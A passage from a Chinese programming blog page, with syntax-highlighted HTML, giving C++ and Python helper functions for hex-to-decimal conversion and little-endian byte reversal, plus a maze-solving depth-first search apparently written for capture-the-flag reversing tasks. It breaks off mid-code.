string">'0x'</span><span class="token operator">+</span><span class="token string">'0'</span> <span class="token operator">*</span> <span class="token punctuation">(</span>length <span class="token operator">-</span> <span class="token builtin">len</span><span class="token punctuation">(</span>tmp<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span> tmp<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><hr><h2 id="十六进制-string-型-十进制-int-型"><a href="#十六进制-string-型-十进制-int-型" class="headerlink" title="十六进制 string 型 - 十进制 int 型"></a>十六进制 string 型 - 十进制 int 型</h2><h3 id="C-版"><a href="#C-版" class="headerlink" title="C++版"></a>C++版</h3><hr><ul><li><strong>特点</strong><ol><li>将 <code>string</code> 类型 的十六进制数 <code>s</code>，从下标 <code>index</code> 的位置开始（包括 <code>&#39;0x&#39;</code>），长度为 <code>length</code> 的部分，转换为十进制数 <code>sum</code></li></ol></li></ul><hr><ul><li><strong>头文件</strong><ol><li><code>#include &lt;math.h&gt;</code></li></ol></li></ul><hr><ul><li><strong>代码</strong><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">unsigned</span> <span class="token keyword">int</span> <span class="token function">string_to_dec</span><span class="token punctuation">(</span>string s<span class="token punctuation">,</span> <span class="token keyword">int</span> index<span class="token punctuation">,</span> <span class="token keyword">int</span> length<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">int</span> sum <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> tmp<span class="token punctuation">[</span>length<span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token comment">// 存放十六进制的每一位字符转换后对应的十进制数</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> length<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>s<span class="token punctuation">[</span>index<span class="token punctuation">]</span> <span class="token operator">>=</span> <span class="token number">97</span> <span class="token operator">&amp;&amp;</span> s<span class="token punctuation">[</span>index<span class="token punctuation">]</span> <span class="token operator">&lt;=</span> <span class="token number">102</span><span class="token punctuation">)</span>  <span class="token comment">// 处理a-f</span>            tmp<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">9</span> <span class="token operator">+</span> s<span class="token punctuation">[</span>index<span class="token punctuation">]</span> <span class="token operator">-</span> <span class="token number">96</span><span class="token punctuation">;</span>        <span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span>s<span class="token punctuation">[</span>index<span class="token punctuation">]</span> <span class="token operator">>=</span> <span class="token number">65</span> <span class="token operator">&amp;&amp;</span> s<span class="token punctuation">[</span>index<span class="token punctuation">]</span> <span class="token operator">&lt;=</span> <span class="token number">70</span><span class="token punctuation">)</span>   <span class="token comment">// 处理A-F</span>            tmp<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">9</span> <span class="token operator">+</span> s<span class="token punctuation">[</span>index<span class="token punctuation">]</span> <span class="token operator">-</span> <span class="token number">64</span><span class="token punctuation">;</span>        <span class="token keyword">else</span>    <span class="token comment">// 处理0-9</span>            tmp<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> s<span class="token punctuation">[</span>index<span class="token punctuation">]</span> <span class="token operator">-</span> <span class="token number">48</span><span class="token punctuation">;</span>        sum <span class="token operator">=</span> sum <span class="token operator">+</span> tmp<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">*</span> <span class="token function">pow</span><span class="token punctuation">(</span><span class="token number">16</span><span class="token punctuation">,</span>length<span class="token operator">-</span><span class="token number">1</span> <span class="token operator">-</span>i<span class="token punctuation">)</span><span class="token punctuation">;</span>        index<span class="token operator">++</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">return</span> sum<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ul><hr><h2 id="小端序-int-型-逆向-int-amp-char-型数组"><a href="#小端序-int-型-逆向-int-amp-char-型数组" class="headerlink" title="小端序 int 型 - 逆向 int &amp; char 型数组"></a>小端序 int 型 - 逆向 int &amp; char 型数组</h2><h3 id="C-版-1"><a href="#C-版-1" class="headerlink" title="C++版"></a>C++版</h3><hr><ul><li><strong>特点</strong>  <ol><li><strong>将小端序存放的 int型 数据转换为正序</strong>，并将结果存放到 int型 的 buffer数组 中 </li><li><mark>若 num 位数超长，将类型改为 <em>int64</em></mark></li><li><mark>若要保存到 <em>char</em> 数组，直接将 <em>int buffer</em> 改为 <em>char buffer</em> 即可</mark></li></ol></li></ul><hr><ul><li><strong>参数</strong></li></ul><table><thead><tr><th align="left">参数</th><th align="left">意义</th></tr></thead><tbody><tr><td align="left"><code>num</code></td><td align="left">小端序存放的 <code>int</code> 型数据</td></tr><tr><td align="left"><code>width_num</code></td><td align="left">小端序存放的 <code>int</code> 型数据对应的 十六进制数 去掉 <code>&#39;0x&#39;</code> 后的长度<br></td></tr><tr><td align="left"><code>buffer</code></td><td align="left">用来保存处理结果的 <code>int</code> 型 数组 <code>buffer[]</code>，<code>buffer[]</code> 是 <code>num</code> 的逆向顺序</td></tr><tr><td align="left"><code>buffer_length</code></td><td align="left"><code>buffer[]</code> 的长度，可根据 <code>width_num / 2 </code>得出</td></tr></tbody></table><hr><ul><li><strong>头文件</strong><ol><li><code>#include &lt;sstream&gt;</code></li></ol></li></ul><hr><ul><li><strong>代码</strong></li></ul><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">void</span> <span class="token function">little_endian</span><span class="token punctuation">(</span><span class="token keyword">int</span> num<span class="token punctuation">,</span> <span class="token keyword">int</span> width_num<span class="token punctuation">,</span> <span class="token keyword">int</span> <span class="token operator">*</span>buffer<span class="token punctuation">,</span> <span class="token keyword">int</span> buffer_length<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    std<span class="token double-colon punctuation">::</span>stringstream ioss<span class="token punctuation">;</span>     <span class="token comment">// 定义字符串流</span>    std<span class="token double-colon punctuation">::</span>string s_temp<span class="token punctuation">;</span>         <span class="token comment">// 存放转化后字符</span>    ioss <span class="token operator">&lt;&lt;</span> std<span class="token double-colon punctuation">::</span>hex <span class="token operator">&lt;&lt;</span> num<span class="token punctuation">;</span>      <span class="token comment">// 以十六制形式输出</span>    ioss <span class="token operator">>></span> s_temp<span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>width_num <span class="token operator">></span> s_temp<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        std<span class="token double-colon punctuation">::</span>string <span class="token function">s_0</span><span class="token punctuation">(</span>width_num <span class="token operator">-</span> s_temp<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token char">'0'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token comment">// 位数不够则补0</span>        s_temp <span class="token operator">=</span> s_0 <span class="token operator">+</span> s_temp<span class="token punctuation">;</span>                            <span class="token comment">// 合并</span>    <span class="token punctuation">&#125;</span>    std<span class="token double-colon punctuation">::</span>string s <span class="token operator">=</span> <span class="token string">"0x"</span> <span class="token operator">+</span> s_temp<span class="token punctuation">.</span><span class="token function">substr</span><span class="token punctuation">(</span>s_temp<span class="token punctuation">.</span><span class="token function">length</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-</span> width_num<span class="token punctuation">,</span> s_temp<span class="token punctuation">.</span><span class="token function">length</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">// 取右width位</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> index <span class="token operator">=</span> <span class="token number">2</span><span class="token punctuation">;</span> index <span class="token operator">+</span> <span class="token number">2</span> <span class="token operator">-</span> <span class="token number">1</span> <span class="token operator">&lt;</span> s<span class="token punctuation">.</span><span class="token function">length</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> index <span class="token operator">+=</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">int</span> sum <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>        <span class="token keyword">int</span> tmp<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token comment">// 存放十六进制的每一位字符转换后对应的十进制数</span>        <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">2</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token comment">// 将2长度的字符串转换为十进制数，存放到sum</span>            <span class="token keyword">if</span><span class="token punctuation">(</span>s<span class="token punctuation">[</span>index<span class="token punctuation">]</span> <span class="token operator">>=</span> <span class="token number">97</span> <span class="token operator">&amp;&amp;</span> s<span class="token punctuation">[</span>index<span class="token punctuation">]</span> <span class="token operator">&lt;=</span> <span class="token number">102</span><span class="token punctuation">)</span>  <span class="token comment">// 处理a-f</span>                tmp<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">9</span> <span class="token operator">+</span> s<span class="token punctuation">[</span>index<span class="token punctuation">]</span> <span class="token operator">-</span> <span class="token number">96</span><span class="token punctuation">;</span>            <span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span>s<span class="token punctuation">[</span>index<span class="token punctuation">]</span> <span class="token operator">>=</span> <span class="token number">65</span> <span class="token operator">&amp;&amp;</span> s<span class="token punctuation">[</span>index<span class="token punctuation">]</span> <span class="token operator">&lt;=</span> <span class="token number">70</span><span class="token punctuation">)</span>   <span class="token comment">// 处理A-F</span>                tmp<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">9</span> <span class="token operator">+</span> s<span class="token punctuation">[</span>index<span class="token punctuation">]</span> <span class="token operator">-</span> <span class="token number">64</span><span class="token punctuation">;</span>            <span class="token keyword">else</span>    <span class="token comment">// 处理0-9</span>                tmp<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> s<span class="token punctuation">[</span>index<span class="token punctuation">]</span> <span class="token operator">-</span> <span class="token number">48</span><span class="token punctuation">;</span>            sum <span class="token operator">=</span> sum <span class="token operator">+</span> tmp<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">*</span> <span class="token function">pow</span><span class="token punctuation">(</span><span class="token number">16</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token operator">-</span><span class="token number">1</span> <span class="token operator">-</span>i<span class="token punctuation">)</span><span class="token punctuation">;</span>            index<span class="token operator">++</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        index <span class="token operator">=</span> index <span class="token operator">-</span> <span class="token number">2</span><span class="token punctuation">;</span>   <span class="token comment">// 因为前面修改了index，后面还要用index控制循环，所以这里将其还原</span>        buffer<span class="token punctuation">[</span>buffer_length<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> sum<span class="token punctuation">;</span>  <span class="token comment">// 将十进制数sum逆向存储到 buffer[]</span>        buffer_length<span class="token operator">--</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><h2 id="小端序-int-型-逆向-string-型字符串"><a href="#小端序-int-型-逆向-string-型字符串" class="headerlink" title="小端序 int 型 - 逆向 string 型字符串"></a>小端序 int 型 - 逆向 string 型字符串</h2><h3 id="C-版-2"><a href="#C-版-2" class="headerlink" title="C++版"></a>C++版</h3><hr><ul><li><strong>特点</strong><ol><li><strong>将小端序存放的 int型 数据转换为正序</strong>，并将结果存放到 string字符串 buffer 中</li><li><mark>若 num 位数超长，将类型改为 <strong>int64</strong></mark></li></ol></li></ul><hr><ul><li>参数：</li></ul><table><thead><tr><th>参数</th><th>意义</th></tr></thead><tbody><tr><td><code>num</code></td><td>小端序存放的 <code>int</code> 型数</td></tr><tr><td><code>width_num</code></td><td>小端序存放的 <code>int</code> 型数据对应的 十六进制数 除去 <code>&#39;0x&#39;</code> 后的长度</td></tr><tr><td><code>buffer_length</code></td><td>字符串 <code>buffer</code> 的长度，可根据 <code>width_num / 2</code> 得出</td></tr></tbody></table><hr><ul><li><strong>头文件</strong><ol><li><code>#include &lt;sstream&gt;</code></li></ol></li></ul><hr><ul><li><strong>代码</strong></li></ul><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp">string <span class="token function">little_endian</span><span class="token punctuation">(</span><span class="token keyword">int</span> num<span class="token punctuation">,</span> <span class="token keyword">int</span> width_num<span class="token punctuation">,</span> <span class="token keyword">int</span> buffer_length<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    std<span class="token double-colon punctuation">::</span>stringstream ioss<span class="token punctuation">;</span>     <span class="token comment">// 定义字符串流</span>    std<span class="token double-colon punctuation">::</span>string s_temp<span class="token punctuation">;</span>         <span class="token comment">// 存放转化后字符</span>    ioss <span class="token operator">&lt;&lt;</span> std<span class="token double-colon punctuation">::</span>hex <span class="token operator">&lt;&lt;</span> num<span class="token punctuation">;</span>      <span class="token comment">// 以十六制形式输出</span>    ioss <span class="token operator">>></span> s_temp<span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>width_num <span class="token operator">></span> s_temp<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        std<span class="token double-colon punctuation">::</span>string <span class="token function">s_0</span><span class="token punctuation">(</span>width_num <span class="token operator">-</span> s_temp<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token char">'0'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token comment">// 位数不够则补0</span>        s_temp <span class="token operator">=</span> s_0 <span class="token operator">+</span> s_temp<span class="token punctuation">;</span>                            <span class="token comment">// 合并</span>    <span class="token punctuation">&#125;</span>    std<span class="token double-colon punctuation">::</span>string s <span class="token operator">=</span> <span class="token string">"0x"</span> <span class="token operator">+</span> s_temp<span class="token punctuation">.</span><span class="token function">substr</span><span class="token punctuation">(</span>s_temp<span class="token punctuation">.</span><span class="token function">length</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-</span> width_num<span class="token punctuation">,</span> s_temp<span class="token punctuation">.</span><span class="token function">length</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">// 取右width位</span>    string buffer <span class="token operator">=</span> <span class="token string">""</span><span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> index <span class="token operator">=</span> width_num<span class="token punctuation">;</span> index <span class="token operator">>=</span> <span class="token number">2</span><span class="token punctuation">;</span> index <span class="token operator">-=</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">char</span> sum <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>        <span class="token keyword">int</span> tmp<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token comment">// 存放十六进制的每一位字符转换后对应的十进制数</span>        <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">2</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token comment">// 将2长度的字符串转换为十进制数，存放到sum</span>            <span class="token keyword">if</span><span class="token punctuation">(</span>s<span class="token punctuation">[</span>index<span class="token punctuation">]</span> <span class="token operator">>=</span> <span class="token number">97</span> <span class="token operator">&amp;&amp;</span> s<span class="token punctuation">[</span>index<span class="token punctuation">]</span> <span class="token operator">&lt;=</span> <span class="token number">102</span><span class="token punctuation">)</span>  <span class="token comment">// 处理a-f</span>                tmp<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">9</span> <span class="token operator">+</span> s<span class="token punctuation">[</span>index<span class="token punctuation">]</span> <span class="token operator">-</span> <span class="token number">96</span><span class="token punctuation">;</span>            <span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span>s<span class="token punctuation">[</span>index<span class="token punctuation">]</span> <span class="token operator">>=</span> <span class="token number">65</span> <span class="token operator">&amp;&amp;</span> s<span class="token punctuation">[</span>index<span class="token punctuation">]</span> <span class="token operator">&lt;=</span> <span class="token number">70</span><span class="token punctuation">)</span>   <span class="token comment">// 处理A-F</span>                tmp<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">9</span> <span class="token operator">+</span> s<span class="token punctuation">[</span>index<span class="token punctuation">]</span> <span class="token operator">-</span> <span class="token number">64</span><span class="token punctuation">;</span>            <span class="token keyword">else</span>    <span class="token comment">// 处理0-9</span>                tmp<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> s<span class="token punctuation">[</span>index<span class="token punctuation">]</span> <span class="token operator">-</span> <span class="token number">48</span><span class="token punctuation">;</span>            sum <span class="token operator">=</span> sum <span class="token operator">+</span> tmp<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">*</span> <span class="token function">pow</span><span class="token punctuation">(</span><span class="token number">16</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token operator">-</span><span class="token number">1</span> <span class="token operator">-</span>i<span class="token punctuation">)</span><span class="token punctuation">;</span>            index<span class="token operator">++</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        index <span class="token operator">=</span> index <span class="token operator">-</span> <span class="token number">2</span><span class="token punctuation">;</span>   <span class="token comment">// 因为前面修改了index，后面还要用index控制循环，所以这里将其还原</span>        buffer <span class="token operator">+=</span> sum<span class="token punctuation">;</span>  <span class="token comment">// 将字符sum逆向存储到 buffer字符串</span>        buffer_length<span class="token operator">--</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">return</span> buffer<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="Python版-1"><a href="#Python版-1" class="headerlink" title="Python版"></a>Python版</h3><hr><ul><li><strong>特点</strong><ol><li><strong>将小端序存放的 int型 数据转换为正序</strong>，并将结果存放到 string字符串 buffer 中</li></ol></li></ul><hr><ul><li>参数：</li></ul><table><thead><tr><th>参数</th><th>意义</th></tr></thead><tbody><tr><td><code>num</code></td><td>小端序存放的 <code>int</code> 型数</td></tr><tr><td><code>width_num</code></td><td>小端序存放的 <code>int</code> 型数据对应的 十六进制数 除去 <code>&#39;0x&#39;</code> 后的长度</td></tr></tbody></table><hr><ul><li><strong>代码</strong></li></ul><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">little_endian</span><span class="token punctuation">(</span>num<span class="token punctuation">,</span> width_num<span class="token punctuation">)</span><span class="token punctuation">:</span>      hex_str <span class="token operator">=</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>num<span class="token punctuation">)</span>  <span class="token comment"># 将int数据转换为十六进制的字符串  </span>    <span class="token keyword">while</span> <span class="token builtin">len</span><span class="token punctuation">(</span>hex_str<span class="token punctuation">)</span> <span class="token operator">!=</span> width_num <span class="token operator">+</span> <span class="token number">2</span><span class="token punctuation">:</span>          hex_str <span class="token operator">=</span> <span class="token string">"0x"</span> <span class="token operator">+</span> <span class="token string">"0"</span> <span class="token operator">*</span> <span class="token punctuation">(</span>width_num <span class="token operator">-</span> <span class="token builtin">len</span><span class="token punctuation">(</span>hex_str<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span> hex_str<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">]</span>  <span class="token comment"># 位数不足width的用0凑齐  </span>    <span class="token builtin">buffer</span> <span class="token operator">=</span> <span class="token string">""</span>  <span class="token comment"># 用于存放生成的字符串  </span>    index <span class="token operator">=</span> width_num      <span class="token keyword">while</span> index <span class="token operator">>=</span> <span class="token number">2</span><span class="token punctuation">:</span>          tmp <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span><span class="token punctuation">(</span>hex_str<span class="token punctuation">[</span>index<span class="token punctuation">:</span> index<span class="token operator">+</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span>  <span class="token comment"># 每两位string转换为十六进制int型数据  </span>        <span class="token builtin">buffer</span> <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>tmp<span class="token punctuation">)</span>  <span class="token comment"># 将int型作为char存入s  </span>        index <span class="token operator">-=</span> <span class="token number">2</span>      <span class="token keyword">return</span> <span class="token builtin">buffer</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><h2 id="走迷宫"><a href="#走迷宫" class="headerlink" title="走迷宫"></a>走迷宫</h2><h3 id="Python版-2"><a href="#Python版-2" class="headerlink" title="Python版"></a>Python版</h3><hr><ul><li><strong>特点</strong><ol><li>给出迷宫，起始位置和终点位置，输出走迷宫的路径</li><li>迷宫中 0 代表路，1 代表墙壁</li></ol></li></ul><hr><ul><li><strong>代码</strong></li></ul><pre class="line-numbers language-python" data-language="python"><code class="language-python">maze <span class="token operator">=</span> <span class="token punctuation">[</span>      <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span>      <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span>      <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span>      <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span>      <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span>      <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span>      <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">]</span>    usedmap <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">[</span><span class="token number">0</span> <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>maze<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">]</span> <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>maze<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">]</span>  <span class="token comment">## 生成与迷宫相同规格的全0列表，用来记录已经走过的位置  </span>  sti <span class="token operator">=</span> <span class="token number">1</span>  <span class="token comment">## 初始位置的横坐标  </span>stj <span class="token operator">=</span> <span class="token number">1</span>  <span class="token comment">## 初始位置的纵坐标  </span>edi <span class="token operator">=</span> <span class="token number">5</span>  <span class="token comment">## 终点位置的横坐标  </span>edj <span class="token operator">=</span> <span class="token number">5</span>  <span class="token comment">## 终点位置的纵坐标  </span>flag <span class="token operator">=</span> <span class="token string">''</span>      <span class="token keyword">def</span> <span class="token function">dfs</span><span class="token punctuation">(</span>x<span class="token punctuation">,</span> y<span class="token punctuation">)</span><span class="token punctuation">:</span>  <span class="token comment">## 走迷宫  </span>    <span class="token keyword">global</span> flag      <span class="token keyword">if</span> x <span class="token operator">==</span> edi <span class="token keyword">and</span> y <span class="token operator">==</span> edj<span class="token punctuation">:</span>          <span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span>          <span class="token keyword">return</span>      <span class="token keyword">if</span> maze<span class="token punctuation">[</span>x <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span>y<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">0</span> <span class="token keyword">and</span> usedmap<span class="token punctuation">[</span>x <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span>y<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>  <span class="token comment">## 可以往下走  </span>        usedmap<span class="token punctuation">[</span>x<span class="token punctuation">]</span><span class="token 